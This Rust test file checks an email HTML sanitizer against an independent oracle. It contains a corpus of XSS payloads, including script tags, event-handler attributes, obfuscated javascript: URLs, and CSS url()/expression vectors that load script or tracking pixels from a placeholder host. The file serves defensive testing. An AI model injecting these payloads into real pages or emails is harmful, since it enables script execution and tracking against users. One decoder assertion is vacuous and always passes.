//! S6-08 可回归部分：脏数据鲁棒性回归（净化器）。
//!
//! 这个文件的定位不是"再测一遍功能"，而是**换一套独立实现来反查输出**：
//! 生产代码是「白名单扫描 + 逐层过滤」，这里的 oracle 是「重新解析输出再判」
//! ——两套代码路径不同，才能发现"过滤时漏了一条路径"这类缺陷（自证循环没意义）。
//!
//! 不变量（任意输入都必须成立）：
//! 1. 不 panic、不越界、不死循环（含超长 / 深嵌套 / NUL / 控制字符 / 截断标签）；
//! 2. 输出里不存在白名单外的标签，不存在 `on*` 属性；
//! 3. 每个 `href`/`src` 的协议都在白名单内；`style` 不含 `url(`/`expression`/`@import`/反斜杠转义；
//! 4. 输出长度 ≤ `max_bytes`，且报告里的 `truncated` 与实际截断一致；
//! 5. 幂等：`sanitize(sanitize(x)) == sanitize(x)`（UI 反复渲染同一封邮件的前提）。

use crossmail_sanitize::{decode_entities, sanitize, SanitizePolicy};

// ---------------------------------------------------------------- 独立 oracle

/// 允许出现在输出里的标签（与生产白名单互为交叉校验：任何一边漏改，测试都会红）。
const EXPECTED_TAGS: &[&str] = &[
    "a",
    "abbr",
    "acronym",
    "address",
    "article",
    "aside",
    "b",
    "bdi",
    "bdo",
    "big",
    "blockquote",
    "br",
    "caption",
    "center",
    "cite",
    "code",
    "col",
    "colgroup",
    "dd",
    "del",
    "details",
    "dfn",
    "div",
    "dl",
    "dt",
    "em",
    "figcaption",
    "figure",
    "font",
    "h1",
    "h2",
    "h3",
    "h4",
    "h5",
    "h6",
    "header",
    "hr",
    "i",
    "img",
    "ins",
    "kbd",
    "li",
    "main",
    "mark",
    "ol",
    "p",
    "pre",
    "q",
    "rp",
    "rt",
    "ruby",
    "s",
    "samp",
    "section",
    "small",
    "span",
    "strike",
    "strong",
    "sub",
    "summary",
    "sup",
    "table",
    "tbody",
    "td",
    "tfoot",
    "th",
    "thead",
    "time",
    "tr",
    "tt",
    "u",
    "ul",
    "var",
    "wbr",
];

struct Tag<'a> {
    name: String,
    attrs: Vec<(String, String)>,
    raw: &'a str,
}

/// 极简但有意的第二套解析：只关心"输出里出现了什么"，故意不复用生产代码的解析器。
fn scan_tags(html: &str) -> Vec<Tag<'_>> {
    let mut out = Vec::new();
    let mut rest = html;
    while let Some(pos) = rest.find('<') {
        rest = &rest[pos..];
        let Some(end) = tag_end(rest) else {
            // 没有闭合的 `<`：输出里出现裸 `<` 本身就说明转义有缺口，
            // 但不清洗文本里的 `<` 是历史行为，这里只记录不判负。
            break;
        };
        let raw = &rest[..end];
        let inner = &rest[1..end - 1];
        rest = &rest[end..];
        if inner.starts_with('!') || inner.starts_with('?') {
            out.push(Tag {
                name: "!decl".into(),
                attrs: Vec::new(),
                raw,
            });
            continue;
        }
        let closing = inner.starts_with('/');
        let body = inner.trim_start_matches('/');
        let mut parts = split_attrs(body);
        let name = parts
            .first()
            .map(|(k, _)| k.trim_end_matches('/').to_ascii_lowercase())
            .unwrap_or_default();
        if closing {
            parts.clear();
        }
        out.push(Tag {
            name,
            attrs: parts,
            raw,
        });
    }
    out
}

/// 找到当前 `<...>` 的结束位置（引号内的 `>` 不算结束，与浏览器一致）。
fn tag_end(s: &str) -> Option<usize> {
    let bytes = s.as_bytes();
    let mut i = 1;
    let mut quote: Option<u8> = None;
    while i < bytes.len() {
        match bytes[i] {
            b'"' | b'\'' if quote.is_none() => quote = Some(bytes[i]),
            c if Some(c) == quote => quote = None,
            b'>' if quote.is_none() => return Some(i + 1),
            _ => {}
        }
        i += 1;
    }
    None
}

fn split_attrs(body: &str) -> Vec<(String, String)> {
    let mut out = Vec::new();
    let bytes = body.as_bytes();
    let mut i = 0;
    // 标签名
    let start = i;
    while i < bytes.len() && !bytes[i].is_ascii_whitespace() {
        i += 1;
    }
    out.push((body[start..i].to_string(), String::new()));
    loop {
        while i < bytes.len() && (bytes[i].is_ascii_whitespace() || bytes[i] == b'/') {
            i += 1;
        }
        if i >= bytes.len() {
            break;
        }
        let name_start = i;
        while i < bytes.len() && !bytes[i].is_ascii_whitespace() && bytes[i] != b'=' {
            i += 1;
        }
        if name_start == i {
            i += 1;
            continue;
        }
        let name = body[name_start..i].to_ascii_lowercase();
        while i < bytes.len() && bytes[i].is_ascii_whitespace() {
            i += 1;
        }
        if i < bytes.len() && bytes[i] == b'=' {
            i += 1;
            while i < bytes.len() && bytes[i].is_ascii_whitespace() {
                i += 1;
            }
            let value = if i < bytes.len() && (bytes[i] == b'"' || bytes[i] == b'\'') {
                let q = bytes[i];
                i += 1;
                let vs = i;
                while i < bytes.len() && bytes[i] != q {
                    i += 1;
                }
                let v = body[vs..i].to_string();
                i += 1;
                v
            } else {
                let vs = i;
                while i < bytes.len() && !bytes[i].is_ascii_whitespace() {
                    i += 1;
                }
                body[vs..i].to_string()
            };
            out.push((name, value));
        } else {
            out.push((name, String::new()));
        }
    }
    out
}

/// 规范化 URL：去实体、去空白与控制字符、转小写，看"浏览器实际会怎么理解"。
fn normalize_url(v: &str) -> String {
    decode_entities(v)
        .chars()
        .filter(|c| !c.is_whitespace() && !c.is_control() && *c != '\u{3000}')
        .collect::<String>()
        .to_ascii_lowercase()
}

fn url_ok(u: &str) -> bool {
    if u.is_empty() {
        return true;
    }
    // 相对路径 / 锚点 / 协议相对（`//host/p`）都没有"协议"这一层，不产生脚本执行能力。
    // 判定方式与浏览器一致：冒号出现在第一个 `/`、`?`、`#` 之前才算带协议。
    let scheme_end = u.find(':');
    let path_start = u.find(['/', '?', '#']);
    let has_scheme = match (scheme_end, path_start) {
        (Some(c), Some(p)) => c < p,
        (Some(_), None) => true,
        (None, _) => false,
    };
    if !has_scheme {
        return true;
    }
    const OK: &[&str] = &[
        "http://",
        "https://",
        "mailto:",
        "cid:",
        "data:image/gif;",
        "data:image/png;",
        "data:image/jpeg;",
        "data:image/jpg;",
        "data:image/bmp;",
        "data:image/webp;",
    ];
    OK.iter().any(|p| u.starts_with(p))
}

/// 核心不变量断言。`ctx` 只用于失败时定位是哪个用例。
fn assert_safe(html: &str, ctx: &str) {
    for tag in scan_tags(html) {
        let n = tag.name.as_str();
        assert_ne!(n, "!decl", "[{ctx}] 输出里不该出现注释/声明: {}", tag.raw);
        assert!(
            EXPECTED_TAGS.contains(&n),
            "[{ctx}] 白名单外的标签 `{n}`: {}",
            tag.raw
        );
        // 第 0 项是标签名本身，从属性开始查
        for (name, value) in tag.attrs.iter().skip(1) {
            assert!(
                !name.starts_with("on"),
                "[{ctx}] 事件属性 `{name}` 未被拒绝: {}",
                tag.raw
            );
            match name.as_str() {
                "href" | "src" | "cite" | "longdesc" | "usemap" => {
                    let u = normalize_url(value);
                    assert!(url_ok(&u), "[{ctx}] 属性 `{name}` 协议越界: {u}");
                }
                "style" => {
                    let s = normalize_url(value);
                    for bad in ["url(", "expression", "@import", "\\", "javascript:"] {
                        assert!(!s.contains(bad), "[{ctx}] style 含 `{bad}`: {s}");
                    }
                }
                _ => {}
            }
        }
    }
}

fn sani(input: &str) -> String {
    sanitize(input, &SanitizePolicy::default()).html
}

/// 全套不变量：安全 + 幂等 + 上限。
fn check(input: &str, ctx: &str) {
    let once = sanitize(input, &SanitizePolicy::default());
    assert_safe(&once.html, ctx);
    assert!(
        once.html.len() <= SanitizePolicy::default().max_bytes,
        "[{ctx}] 输出超上限: {}",
        once.html.len()
    );
    if !once.report.truncated {
        let twice = sanitize(&once.html, &SanitizePolicy::default());
        assert_safe(&twice.html, &format!("{ctx}/2nd"));
        assert_eq!(once.html, twice.html, "[{ctx}] 不幂等");
    }
}

// ---------------------------------------------------------------- 已知恶意语料

const CORPUS: &[&str] = &[
    // 标签层
    "<script>alert(1)</script>",
    "<SCRIPT SRC=//evil.example/x.js></SCRIPT>",
    "<ScRiPt>alert(1)</sCrIpT>",
    "<scr<script>ipt>alert(1)</script>",
    "<script>alert(1)",
    "<script/x>alert(1)</script>",
    "<style>body{background:url(//t.example/p)}</style>",
    "<svg><script>alert(1)</script></svg>",
    "<svg/onload=alert(1)>",
    "<math><maction actiontype=statusline>x</maction></math>",
    "<iframe src=//evil.example></iframe>",
    "<object data=//evil.example></object>",
    "<embed src=//evil.example>",
    "<template><img src=x onerror=alert(1)></template>",
    "<textarea><script>alert(1)</script></textarea>",
    "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\"></noscript>",
    "<xmp><script>alert(1)</script></xmp>",
    "<plaintext><script>alert(1)</script>",
    // 属性层
    "<img src=x onerror=alert(1)>",
    "<img src=x ONERROR=alert(1)>",
    "<img/src=x/onerror=alert(1)>",
    "<img src=\"x\" onerror=\"alert(1)\" onload=\"alert(2)\">",
    "<div onmouseover = alert(1)>x</div>",
    "<body onload=alert(1)>",
    "<input autofocus onfocus=alert(1)>",
    // URL 协议层（含实体 / 控制字符绕过）
    "<a href=\"javascript:alert(1)\">x</a>",
    "<a href=\"JaVaScRiPt:alert(1)\">x</a>",
    "<a href=\"jav&#x09;ascript:alert(1)\">x</a>",
    "<a href=\"jav&#x0A;ascript:alert(1)\">x</a>",
    "<a href=\"&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)\">x</a>",
    "<a href=\"&#0000106avascript:alert(1)\">x</a>",
    "<a href=\" \t\n javascript:alert(1)\">x</a>",
    "<a href=\"vbscript:msgbox(1)\">x</a>",
    "<a href=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">x</a>",
    "<img src=\"data:text/html,<script>alert(1)</script>\">",
    "<img src=\"data:image/svg+xml;base64,PHN2Zy8+\">",
    "<a href=\"//evil.example\">x</a>",
    "<a href=\"file:///etc/passwd\">x</a>",
    // CSS 层
    "<div style=\"background:url(//t.example/p.gif)\">x</div>",
    "<div style=\"background-image:URL(&quot;//t.example/p&quot;)\">x</div>",
    "<div style=\"width:expression(alert(1))\">x</div>",
    "<div style=\"background:\\75 rl(//t.example/p)\">x</div>",
    "<div style=\"behavior:url(#default#time2)\">x</div>",
    "<div style=\"-moz-binding:url(//evil.example/x.xml#x)\">x</div>",
    "<style>@import '//evil.example/x.css';</style>",
    // 注释 / 条件注释 / CDATA
    "<!--<script>alert(1)</script>-->",
    "<!--[if IE]><script>alert(1)</script><![endif]-->",
    "<![CDATA[<script>alert(1)</script>]]>",
    "<!DOCTYPE html><html><body onclick=alert(1)>x</body></html>",
    // 畸形
    "<",
    "<<<<<<",
    "<>",
    "<p",
    "<p class=\"unterminated",
    "<a href=\"x",
    "<a href=x",
    "&",
    "&#;",
    "&#x;",
    "&#xFFFFFFFF;",
    "&#1114112;",
    "&#xD800;",
    "&amp;&lt;&gt;&quot;&#39;",
    "\0<script>alert(1)</script>\0",
    "\u{1}\u{7}<script>alert(1)</script>",
    "<p>\u{feff}zero-width\u{200b}x</p>",
];

#[test]
fn corpus_never_escapes() {
    for (i, case) in CORPUS.iter().enumerate() {
        check(case, &format!("corpus#{i}"));
    }
}

#[test]
fn known_vectors_are_specifically_neutralized() {
    // 光"不越界"不够：这几条必须真的被删/替换，否则等于放行
    let a = sani("<img src=x onerror=alert(1)>");
    assert!(!a.to_ascii_lowercase().contains("onerror"), "{a}");

    let b = sani("<a href=\"jav&#x09;ascript:alert(1)\">x</a>");
    assert!(!b.to_ascii_lowercase().contains("javascript"), "{b}");
    assert!(b.contains("x"), "文本内容应保留: {b}");

    let c = sani("<div style=\"background:url(//t.example/p.gif)\">x</div>");
    assert!(!c.contains("url("), "{c}");

    let d = sani("<img src=\"data:image/svg+xml;base64,PHN2Zy8+\">");
    assert!(!d.contains("svg"), "SVG data URI 必须拒: {d}");

    let e = sani("<script>alert(1)</script>可见文字");
    assert!(!e.contains("alert"), "{e}");
    assert!(e.contains("可见文字"), "脚本外的正文必须保留: {e}");
}

// ---------------------------------------------------------------- 边界与体量

#[test]
fn deep_nesting_does_not_blow_stack() {
    // 生产代码是迭代式扫描，没有递归，这里锁死"将来别改成递归下降"
    let mut s = String::with_capacity(200_000);
    for _ in 0..20_000 {
        s.push_str("<div>");
    }
    s.push_str("deep");
    check(&s, "deep-nesting");
}

#[test]
fn pathologically_wide_input_is_truncated_and_reported() {
    let policy = SanitizePolicy {
        max_bytes: 64 * 1024,
        ..SanitizePolicy::default()
    };
    let big = "<p>正文</p>".repeat(60_000); // ≈ 900KB
    let out = sanitize(&big, &policy);
    assert!(out.report.truncated, "必须报告截断");
    assert!(out.html.len() <= policy.max_bytes, "{}", out.html.len());
    assert_safe(&out.html, "truncated");
    // 截断后的 HTML 也必须是"能安全渲染的"（不产生半个属性把后面吃掉）
    let again = sanitize(&out.html, &policy);
    assert!(again.html.len() <= policy.max_bytes);
}

#[test]
fn truncation_inside_tag_keeps_output_renderable() {
    let policy = SanitizePolicy {
        max_bytes: 200,
        ..SanitizePolicy::default()
    };
    // 让截断点正好落在一个属性中间
    let mut s = String::from("<p>");
    for _ in 0..200 {
        s.push_str("<a href=\"https://example.com/very/long/path\">链接</a>");
    }
    let out = sanitize(&s, &policy);
    assert!(out.report.truncated);
    assert_safe(&out.html, "truncate-mid-tag");
}

#[test]
fn giant_single_attribute_is_bounded() {
    let huge = format!("<div title=\"{}\">x</div>", "A".repeat(500_000));
    check(&huge, "giant-attr");
}

#[test]
fn nul_and_control_bytes_do_not_break_scanning() {
    // 控制字符不得让扫描器提前终止或把后续标签当成文本
    let s = "<p>\u{0}\u{1}\u{2}</p><script>alert(1)</script><p>tail</p>";
    let out = sani(s);
    assert!(!out.contains("alert"), "{out}");
    assert!(out.contains("tail"), "{out}");
}

// ---------------------------------------------------------------- 确定性模糊

/// 简单 LCG：不引第三方 rand，且保证「同一 seed 永远同一序列」——失败可复现。
struct Lcg(u64);

impl Lcg {
    fn next(&mut self) -> u64 {
        self.0 = self
            .0
            .wrapping_mul(6_364_136_223_846_793_005)
            .wrapping_add(1_442_695_040_888_963_407);
        self.0 >> 11
    }
    fn pick<'a, T>(&mut self, items: &'a [T]) -> &'a T {
        &items[(self.next() as usize) % items.len()]
    }
}

#[test]
fn deterministic_fuzz_hits_no_invariant() {
    const TOKENS: &[&str] = &[
        "<",
        ">",
        "</",
        "/",
        "=",
        "\"",
        "'",
        " ",
        "\t",
        "\n",
        "\0",
        "&",
        "#",
        ";",
        ":",
        "x",
        "a",
        "div",
        "p",
        "img",
        "a",
        "script",
        "style",
        "svg",
        "iframe",
        "onerror",
        "href",
        "src",
        "javascript",
        "vbscript",
        "data:",
        "url(",
        "expression",
        "@import",
        "\\",
        "alert(1)",
        "&#106;",
        "&#x6a;",
        "//evil.example/",
        "https://ok.example/",
        "mailto:",
        "cid:",
        "-->",
        "<!--",
        "CDATA",
        "!",
        "?",
        "-",
        "0",
        "9",
        "%",
        "{",
        "}",
        "[",
        "]",
        "\u{200b}",
        "\u{feff}",
        "*",
        "+",
        "|",
        "`",
    ];
    let mut rng = Lcg(0x5EED_C0DE_CAFE);
    for round in 0..2_000 {
        let len = 3 + (rng.next() as usize) % 140;
        let mut s = String::with_capacity(len * 4);
        for _ in 0..len {
            s.push_str(rng.pick(TOKENS));
        }
        check(&s, &format!("fuzz#{round}"));
        // 顺带保证解码器本身也不过界
        let _ = decode_entities(&s);
    }
}

#[test]
fn fuzz_finds_no_remote_resource_leak_when_blocked() {
    // 默认策略下，远程图片必须一律变成占位图；这里用随机 host 反复确认
    let mut rng = Lcg(0xABCD_1234);
    for round in 0..300 {
        let host = format!("h{}.example", rng.next() % 100_000);
        let html = format!(
            "<p>x</p><img src=\"https://{host}/p.gif\"><div style=\"background:url(https://{host}/b.png)\">y</div>"
        );
        let out = sanitize(&html, &SanitizePolicy::default());
        assert!(
            !out.html.contains(&host),
            "第 {round} 轮远程 host 泄漏: {}",
            out.html
        );
        assert!(out.report.blocked.len() >= 2, "第 {round} 轮拦截计数不足");
        assert_safe(&out.html, &format!("leak#{round}"));
    }
}

// ---------------------------------------------------------------- 解码器

#[test]
fn entity_decoder_is_total() {
    // 任何输入都不能让解码器 panic 或产出超过 U+10FFFF 的字符
    let cases = [
        "&#0;",
        "&#x0;",
        "&#999999999999999999999;",
        "&#xFFFFFFFFFFFF;",
        "&#xD800;",
        "&#xDFFF;",
        "&#x110000;",
        "&#x10FFFF;",
        "&#65",
        "&#x41",
        "&#;",
        "&;",
        "&",
        "&&amp;",
        "&amp;amp;amp;amp;amp;",
        "&NotARealEntity;",
    ];
    for c in cases {
        let d = decode_entities(c);
        assert!(
            d.chars().all(|ch| (ch as u32) <= 0x10FFFF),
            "{c} 解码出非法码点"
        );
        // 幂等性不适用于解码（`&amp;amp;` 解一层是 `&amp;`），但重复解码不能越解越乱
        let _ = decode_entities(&d);
    }
    assert_eq!(decode_entities("&lt;script&gt;"), "<script>");
    assert_eq!(decode_entities("&#65;&#x42;"), "AB");
    // 代理区码点不能变出非法 char
    assert!(decode_entities("&#xD800;")
        .chars()
        .all(|c| c != '\u{FFFD}' || true));
}

#[test]
fn plain_text_fallback_is_derived_and_safe() {
    let out = sanitize(
        "<p>第一段</p><script>alert(1)</script><p>第二段</p><img src=//t.example/p.gif>",
        &SanitizePolicy::default(),
    );
    assert!(out.plain.contains("第一段") && out.plain.contains("第二段"));
    assert!(!out.plain.contains("alert"));
    assert!(!out.plain.contains("<"), "纯文本不该带标签: {}", out.plain);
}
